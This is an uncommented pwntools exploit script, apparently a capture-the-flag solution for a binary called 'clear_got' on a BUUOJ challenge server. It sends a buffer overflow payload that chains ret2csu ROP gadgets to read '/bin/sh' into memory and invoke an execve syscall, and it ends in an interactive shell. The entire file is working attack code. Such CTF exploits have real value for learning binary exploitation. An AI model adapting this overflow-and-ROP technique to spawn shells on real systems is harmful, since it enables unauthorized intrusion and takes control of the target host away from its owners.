from pwn import *

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./clear_got"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 29096)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


context.log_level = "debug"
payload = b"a" * 0x68
payload += p64(0x4007ea)
payload += p64(0) #rbx
payload += p64(0x1) #rbp
payload += p64(0x600e40) #r12
payload += p64(59) #rdx
payload += p64(0x601060) #rsi
payload += p64(0) #rdi
payload += p64(0x4007d0)
#ret2csu

payload += b"A" * 8
payload += p64(0) #rbx
payload += p64(0) #rbp
payload += p64(0x601068) #r12
payload += p64(0) #r13  rdx
payload += p64(0) #r14  rs1
payload += p64(0x601060) #r15  rdi
payload += p64(0x40076e) #syscall
payload += p64(0) #rbp
payload += p64(0x4007d0) #
payload += b"A" * 8

ddebug("b *0x40075c")
io.send(payload)
payload = b"/bin/sh\x00" + p64(0x40076e) + 43 * b'\x00'

io.sendline(payload)
io.interactive()
